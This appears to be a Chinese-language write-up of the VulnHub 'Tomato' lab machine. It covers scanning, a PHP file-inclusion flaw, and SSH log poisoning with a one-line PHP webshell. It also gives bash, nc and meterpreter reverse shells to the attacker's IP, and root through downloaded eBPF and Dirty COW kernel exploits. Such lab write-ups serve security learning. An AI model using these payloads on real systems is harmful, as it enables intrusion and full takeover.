> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dvisoQJyvWmy-AXLjby9KQ)

  

  

点击上方蓝字关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/qLaXsGgOwmOFETMqV9DfenGIAx8BfvBotFhJrgP7IG9WkIkgCP1Q1DDIVsZVqTiasAS9CT66RJrq9Gj0ibkpdeew/640?wx_fmt=png)

安装方法就不多说了, 直接到 vulnhub.com 下载, 使用 vmware 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

扫描 ip 地址

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

首先是常规扫描 ip 是否存活。  

```
root@yimeng:~# nmap -sn 192.168.239.1/24
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-31 12:29 EDT
Nmap scan report for 192.168.239.1
Host is up (0.00030s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.239.2
Host is up (0.00026s latency).
MAC Address: 00:50:56:F8:24:F3 (VMware)
Nmap scan report for 192.168.239.129
Host is up (0.00011s latency).
MAC Address: 00:0C:29:89:56:88 (VMware)
Nmap scan report for 192.168.239.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:ED:C8:89 (VMware)
Nmap scan report for 192.168.239.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 6.65 seconds
```

由扫描结果可知目标 IP 为 192.168.239.129 .

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

扫描端口

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

```
root@yimeng:~# nmap -A -T5 -p- --min-rate 10000 192.168.239.129
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-31 12:31 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 12:31 (0:00:06 remaining)
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.45% done; ETC: 12:31 (0:00:00 remaining)
Nmap scan report for 192.168.239.129
Host is up (0.00097s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomato
2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b3:12:60:32:48:28:eb:ac:80:de:17:d7:96:77:6e:2f (ECDSA)
|_  256 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 (ED25519)
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Private Property
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: 401 Authorization Required
MAC Address: 00:0C:29:89:56:88 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE
HOP RTT     ADDRESS
1   0.97 ms 192.168.239.129
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```

目标开放了 21,80,2211 端口, 这里选择从网站入手。

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

扫 80 端口目录

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

**使用 dirb 扫描工具**

```
root@yimeng:~#dirbhttp://192.168.239.129 /usr/share/wordlists/dirb/common.txt
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Sat Oct 31 12:35:44 2020
URL_BASE: http://192.168.239.129/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://192.168.239.129/ ----
==> DIRECTORY: http://192.168.239.129/antibot_image/
+ http://192.168.239.129/index.html (CODE:200|SIZE:652)
+ http://192.168.239.129/server-status (CODE:403|SIZE:280)


---- Entering directory: http://192.168.239.129/antibot_image/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)


-----------------
END_TIME: Sat Oct 31 12:35:49 2020
DOWNLOADED: 4612 - FOUND: 2
```

**使用 gobuster**

```
gobusterdir--urlhttp://192.168.43.144-w /usr/share/wordlists/dirb/common.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

disable_functions

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

一般网站会配置 die_functions 配置, 可以通过以下脚本检测是否存在遗漏：  

```
<?php
$black = "dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,ini_set,chdir";
$black_list = explode(',', $black);
//这里放字符串
$str = "pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl";
$list = explode(',', $str);
foreach ($black_list as $key => $value) {
if(!in_array($value, $list))
{
echo "find! {$value} is omit!\n";
}
}
echo "finished!";
```

**访问 / antibot_image**  

根据扫描结果, 直接访问 /antibot_image 目录。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0iclaVQgXtZnRwy7ial04rGrU8ycenfI3YU2GL0nl7MQUx5m9ETticSEG2beMgtr2ehh6o6K78ytgNdA/640?wx_fmt=png)

**访问 info.php**

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0iclaVQgXtZnRwy7ial04rGrUDlXLZ7HDtv6U7jGiciaz159hNxGCkxcMAaEt7MfyXczfw2SLCSEWfYtA/640?wx_fmt=png)

由注释可以大概看到, 该网站存在 LFI 漏洞, 可以采用文件包含来 getshell。

**通过 / var/log/auth.log 获取 shell**

根据常见的网站类型, 大致可以知道写入的日志文件及位置包括以下几种：

```
❌ vsftpd: /var/log/vsftpd.log
❌ apache: /var/log/apache/access_log
⭕ nginx: /var/log/nginx/access.log
⭕ ssh: /var/log/auth.log (this is a system authentication log, not just ssh)
```

这里使用 ssh 登录, 将小马写入到 auth.log 文件中。

```
ssh '<?php system($_GET["cmd"]);?>'@192.168.239.129 -p 2211
```

尝试进行命令执行：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0iclaVQgXtZnRwy7ial04rGrUyoWYzSPDfMibXPb9eTrhzCg81k4Fe6g5uvpItE9aooU0OgfkK9ZXVzQ/640?wx_fmt=png)

可以看到这里命令确实是成功执行了。

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

为了更好的进行攻击, 这里选择反弹一个 shell, 推荐一个命令行 urlencode。

```
root@yimeng:/var/log# sudo apt-get install gridsite-clients  安装urlencode
root@yimeng:/var/log# urlencode "bash -c 'bash -i >& /dev/tcp/192.168.239.128/5555 0>&1'"
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.239.128%2F5555%200%3E%261%27
```

访问即可反弹 shell:

```
http://192.168.239.129/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.239.128%2F5555%200%3E%261%27
```

**利用 nc 反弹 shell**  

攻击机:

```
sudo nc -lvp 40 < rshell.php  // rshell.php预先准备好的反弹shell
```

目标机器:

```
nc 192.168.239.128 40 | php  # 直接执行rshell.php文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/gK5Jln77QpfCg4TuDDcMIQ4O2SBicMOFFibY0TJg38IOkGqiaDibqbWB7ibhUBxu2NYqYPf17hMDKDyrF1oibY3IC5Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aXKFGCXFPU1ibwdIPabpKuLwuRibvUKkCGl1rCXjJgPwSFhhsYoEFxqvbv2ejRjA8eIWyhcExpS4BjtJ70J5zNKQ/640?wx_fmt=png)

提权

![](https://mmbiz.qpic.cn/mmbiz_png/MwXV1eZgygVbsHns8UlxuNNkib8W4xVPRYQn1UTdTZI35SFobPbQ97pJsJg1JMMLj3ZucoXsibTSYeWIDdwU4zFQ/640?wx_fmt=png)

使用提权辅助工具:

https://github.com/mzet-/linux-exploit-suggester

```
ww-data@ubuntu:/tmp$wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
<ontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
www-data@ubuntu:/tmp$ ls
ls
VMwareDnD
linux-exploit-suggester.sh
systemd-private-b51e825322ca410c92dd950e634e8b01-systemd-timesyncd.service-uwpQ2X
vmware-root
www-data@ubuntu:/tmp$ bash linux-exploit-suggester.sh
bash linux-exploit-suggester.sh
Available information:
Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS
Searching among:
74 kernel space exploits
45 user space exploits
Possible Exploits:
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow 2
Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Exposure: highly probable
Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04{kernel:4.4.0-21-generic} ]
Download URL: https://www.exploit-db.com/download/40839
ext-url: https://www.exploit-db.com/download/40847
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
[+] [CVE-2017-16995] eBPF_verifier
Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
Exposure: highly probable
Tags:debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
Download URL: https://www.exploit-db.com/download/45010
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
[+] [CVE-2016-8655] chocobo_root
Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
Exposure: highly probable
Tags:[ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
Download URL: https://www.exploit-db.com/download/40871
Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
[+] [CVE-2016-5195] dirtycow
Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Exposure: highly probable
Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
Download URL: https://www.exploit-db.com/download/40611
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

直接脏牛或者 eBPF_verifier 提权即可。  

**使用 eBPF_verifier 提权**

在攻击机上编译二进制程序:

```
oot@yimeng:/tmp/tmp# wget -q https://www.exploit-db.com/download/45010 -O root.c
root@yimeng:/tmp/tmp# ls
root.c
root@yimeng:/tmp/tmp# gcc root.c -o root
root@yimeng:/tmp/tmp# ls
root  root.c
root@yimeng:/tmp/tmp# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

在目标机器上：

```
www-data@ubuntu:/tmp$ wget -q http://192.168.239.128/root
wget -q http://192.168.239.128/root
www-data@ubuntu:/tmp$ ls
ls
VMwareDnD
linux-exploit-suggester.sh
root
systemd-private-b51e825322ca410c92dd950e634e8b01-systemd-timesyncd.service-uwpQ2X
vmware-root
www-data@ubuntu:/tmp$ chmod +x root
chmod +x root
www-data@ubuntu:/tmp$ ./root
./root
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800b9e36700
[*] Leaking sock struct from ffff8800b6938780
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800b949e000
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff8800b949e000
[*] credentials patched, launching shell...
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
#
```

**使用脏牛提权**

```
//搜索编译器
dpkg --list 2>/dev/null | grep compiler | grep -v decompiler 2>/dev/null
cp -v /usr/share/exploitdb/exploits/linux/local/40616.c .
'/usr/share/exploitdb/exploits/linux/local/40616.c' -> './40616.c'
python3 -m http.server # only run if you stopped the previous server
cd /tmp
wget -O cowroot.c http://192.168.1.10:8000/40616.c
gcc-5 cowroot.c -o cowroot -pthread
./cowroot
```

**使用 msf 反弹 shell**

为了更好的学习各种工具, 再次尝试使用 msf 来进行渗透, 首先。生成 php 反弹 shell

```
msfvenom-pphp/meterpreter/reverse_tcpLHOST=192.168.239.128 LPORT=5555 R > test3.php
```

**上传 shell**  

执行 wget 命令, 从远程下载 test3.php。

```
wget -q http://192.168.239.128/test3.php
```

**msf 启动监听模块**

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.239.128
LHOST => 192.168.239.128
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.239.128:5555
^C[-] Exploit failed [user-interrupt]: Interrupt
[-] exploit: Interrupted
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.239.128:5555
[*] Sending stage (39282 bytes) to 192.168.239.129
[*] Meterpreter session 2 opened (192.168.239.128:5555 -> 192.168.239.129:53692) at 2020-10-31 14:03:07 -0400
meterpreter >
```

**尝试提权 - 失败**  

使用 msf 自带的 local_exploit_suggester 模块进行提权, 未找到可用的建议, 提权失败。

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options
Module options (post/multi/recon/local_exploit_suggester):
Name             Current Setting  Required  Description
----             ---------------  --------  -----------
SESSION                           yes       The session to run this module on
SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 3
SESSION => 3
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 192.168.239.129 - Collecting local exploits for php/linux...
[-] 192.168.239.129 - No suggestions available.
[*] Post module execution completed
```

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0iclaVQgXtZnRwy7ial04rGrUFunvo755zicp4naEiaqmwjAqR8ZSicgrbYf0jel87yG62hEqz0xf9MNnQ/640?wx_fmt=png)